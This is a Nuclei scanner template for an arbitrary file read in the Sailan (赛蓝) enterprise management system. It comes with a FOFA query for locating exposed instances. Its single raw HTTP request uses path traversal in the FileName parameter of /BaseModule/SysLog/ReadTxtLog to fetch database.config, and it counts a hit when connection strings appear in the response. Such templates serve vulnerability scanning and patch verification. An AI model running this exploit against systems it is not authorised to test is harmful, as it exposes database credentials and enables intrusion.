id: sailan-ReadTxtLog-fileread

info:
  name: 赛蓝企业管理系统-任意文件读取-ReadTxtLog
  author: HuanXiong
  severity: critical
  metadata: 
    fofa-query: body="www.cailsoft.com" || body="赛蓝企业管理系统"

  tags: File Reading

http:
  - raw:
      - |
        @timeout: 30s   
        GET /BaseModule/SysLog/ReadTxtLog?FileName=../XmlConfig\database.config HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
                  
        
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'status_code==200 && contains_all(body,"<connectionStrings>")'